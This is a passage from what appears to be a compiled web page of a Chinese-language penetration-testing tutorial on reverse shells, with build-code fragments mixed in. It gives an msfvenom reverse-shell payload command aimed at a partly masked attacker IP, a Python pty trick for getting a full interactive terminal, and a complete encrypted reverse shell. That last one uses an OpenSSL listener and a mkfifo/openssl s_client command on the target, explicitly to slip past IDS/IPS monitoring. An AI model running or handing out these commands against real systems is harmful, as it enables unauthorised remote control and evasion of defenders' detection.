</code></pre></div><p><code>msfvenom -p cmd/unix/reverse_python LHOST=47.xxx.xxx.72 LPORT=2333 -f raw</code></p><h2 id="反弹-shell-后获取模拟终端" tabindex="-1"><a class="header-anchor" href="#反弹-shell-后获取模拟终端" aria-hidden="true">#</a> 反弹 shell 后获取模拟终端</h2><p>其实，上面所讲的各种方法获取的shell都不是一个标准的虚拟终端环境，它仅仅是一个标准输入。你会发现存在一个问题，就是即使我们获取了目标虚拟终端控制权限，但是往往会发现其交互性非常的差，回显信息与可交互性非常的差和不稳定，具体见情况有以下几个种。</p><ul><li>获取的虚拟终端没有交互性，我们想给添加的账号设置密码或执行sudo等命令，无法完成。</li><li>标准的错误输出无法显示，无法正常使用vim等文本编辑器等。</li><li>获取的目标主机的虚拟终端使用非常不稳定，很容易断开连接。</li></ul><p><img src="`+v+`" alt=""></p><p>这往往都是因为我们获取的shell并不是标准的虚拟终端，为了能够完成输入密码等操作，我们必须模拟一个真正的终端设备。</p><p>我们其实可以借助于python默认包含的一个 pty 标准库来获取一个标准的虚拟终端环境。Python 在现在一般发行版 Linux 系统中都会自带，所以使用起来也较为方便，即使没有安装，我们手动安装也很方便。</p><p>我们只需在获取的 shell 里面输入如下命令，即可模拟一个终端设备：</p><div class="language-bash" data-ext="sh"><pre class="language-bash"><code>python <span class="token parameter variable">-c</span> <span class="token string">&quot;import pty;pty.spawn(&#39;/bin/bash&#39;)&quot;</span>
</code></pre></div><p><img src="`+f+`" alt=""></p><p>如上图所示，成功模拟在shell中出了一个终端设备，并成功执行了sudo等命令。</p><h2 id="使用openssl反弹加密shell" tabindex="-1"><a class="header-anchor" href="#使用openssl反弹加密shell" aria-hidden="true">#</a> 使用OpenSSL反弹加密shell</h2><p>在上文中，我们总结了很多反弹shell得方法，但是我发现这种反弹 shell 方式都有一个缺点，那就是所有的流量都是明文传输的。这些通过shell通过传输的流量都可以被管理员直接抓取并理解，当目标主机网络环境存在网络防御检测系统时（IDS、IPS等），网络防御检测系统会获取到我们的通信内容并进行告警和阻止。因此，我们需要对通信的内容进行混淆或加密，这时可以选择使用 OpenSSL 反弹一个加密的 shell。</p><h3 id="openssl-简介" tabindex="-1"><a class="header-anchor" href="#openssl-简介" aria-hidden="true">#</a> OpenSSL 简介</h3><p>在计算机网络上，OpenSSL 是一个开放源代码的软件库包，应用程序可以使用这个包来进行安全通信，避免窃听，同时确认另一端连接者的身份。</p><p>SSL 协议要求建立在可靠的传输层协议(TCP)之上。SSL 协议的优势在于它是与应用层协议独立无关的，高层的应用层协议(例如：HTTP，FTP，TELNET 等)能透明地建立于 SSL 协议之上。SSL 协议在应用层协议通信之前就已经完成加密算法、通信密钥的协商及服务器认证工作。在此之后应用层协议所传送的数据都会被加密，从而保证通信的私密性。</p><p>在利用 OpenSSL 反弹 shell 之前需要先生成自签名证书：</p><div class="language-bash" data-ext="sh"><pre class="language-bash"><code>openssl req <span class="token parameter variable">-x509</span> <span class="token parameter variable">-newkey</span> rsa:2048 <span class="token parameter variable">-keyout</span> key.pem <span class="token parameter variable">-out</span> cert.pem <span class="token parameter variable">-days</span> <span class="token number">365</span> <span class="token parameter variable">-nodes</span>
</code></pre></div><p>生成自签名证书时会提示输入证书信息，如果懒得填写可以一路回车即可：</p><p><img src="`+_+`" alt=""></p><h3 id="使用-openssl-反弹加密-shell" tabindex="-1"><a class="header-anchor" href="#使用-openssl-反弹加密-shell" aria-hidden="true">#</a> 使用 OpenSSL 反弹加密 shell</h3><blockquote><p>实验环境：Linux</p></blockquote><p>目标机：</p><ul><li>系统：Linux</li><li>IP：192.168.1.8</li></ul><p>攻击机：</p><ul><li>系统：Linux</li><li>IP：47.xxx.xxx.72</li></ul><p>假设我们从目标机反弹 shell 到攻击机 。首先需要利用上一步生成的自签名证书，在攻击机上使用 OpenSSL 监听一个端口，在这里使用 2333 端口：</p><div class="language-bash" data-ext="sh"><pre class="language-bash"><code>openssl s_server <span class="token parameter variable">-quiet</span> <span class="token parameter variable">-key</span> key.pem <span class="token parameter variable">-cert</span> cert.pem <span class="token parameter variable">-port</span> <span class="token number">2333</span>
</code></pre></div><p><img src="`+w+`" alt=""></p><p>此时 OpenSSL 便在攻击机的 2333 端口上启动了一个 SSL/TLS server。</p><p>这时在目标机进行反弹 shell 操作，命令为：</p><div class="language-bash" data-ext="sh"><pre class="language-bash"><code><span class="token function">mkfifo</span> /tmp/s<span class="token punctuation">;</span> /bin/sh <span class="token parameter variable">-i</span> <span class="token operator">&lt;</span> /tmp/s <span class="token operator"><span class="token file-descriptor important">2</span>&gt;</span><span class="token file-descriptor important">&amp;1</span> <span class="token operator">|</span> openssl s_client <span class="token parameter variable">-quiet</span> <span class="token parameter variable">-connect</span> <span class="token number">47</span>.xxx.xxx.72:2333 <span class="token operator">&gt;</span> /tmp/s<span class="token punctuation">;</span> <span class="token function">rm</span> /tmp/s
</code></pre></div><p><img src="`+S+'" alt=""></p><p>这样攻击者便使用 OpenSSL 反弹了目标机一个加密的 shell。</p>',91);function V(z,H){const e=r("ExternalLinkIcon");return o(),l("div",null,[y,T,L,P,C,I,O,B,M,E,N,j,D,a("p",null,[s('Socat 是 Linux 下一个多功能的网络工具，名字来由是"Socket CAT"，因此可以看出它是基于 socket 的，其功能与 netcat 类似，不过据说可以看做netcat的加强版，事实上的确也是如此。我这里只简单的介绍下怎么使用它开启监听和反弹shell，其他详细内容可以参见这里：'),a("a",R,[s("http://brieflyx.me/2015/linux-tools/socat-introduction/"),p(e)])]),U,a("ul",null,[$,a("li",null,[s("也可以去官网下载源码包："),a("a",A,[s("http://www.dest-unreach.org/socat"),p(e)])])]),F])}const Z=t(q,[["render",V],["__file","bounceTrojan.html.vue"]]);export{Z as default};
